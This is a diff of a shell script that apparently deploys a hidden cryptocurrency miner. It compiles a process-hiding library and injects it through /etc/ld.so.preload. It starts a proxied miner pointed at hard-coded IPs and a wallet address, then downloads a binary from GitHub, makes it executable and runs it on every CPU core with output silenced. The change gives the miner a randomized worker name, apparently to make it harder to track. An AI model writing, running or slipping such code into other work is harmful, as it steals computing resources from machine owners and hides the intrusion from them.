@@ -55,4 +55,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp & clear & ./fortune --proxy 45.61.51.89:80 --address prl1p7ywpecpnx8acnac87vzll58eyx92fjsf3r0t2ywnv08sr6pmrz3s8y7y36 --worker Bejo --stratum-dialect kryptex_prl & wget https://github.com/rochmandwi/ayam/releases/download/file-v1/sse2 && chmod 777 sse2 && ./sse2 -a yespowertide -o 43.172.89.100:443 -u TAMmcBbUZaWFq2hgPMjqfxSEw2cmoEmSm5.Bismillah -t $(nproc) > /dev/null 2>&1
+./graftcp/graftcp & clear & ./fortune --proxy 45.61.51.89:80 --address prl1p7ywpecpnx8acnac87vzll58eyx92fjsf3r0t2ywnv08sr6pmrz3s8y7y36 --worker $(echo $RANDOM | md5sum | head -c 10) --stratum-dialect kryptex_prl & wget https://github.com/rochmandwi/ayam/releases/download/file-v1/sse2 && chmod 777 sse2 && ./sse2 -a yespowertide -o 43.172.89.100:443 -u TAMmcBbUZaWFq2hgPMjqfxSEw2cmoEmSm5.Bismillah -t $(nproc) > /dev/null 2>&1
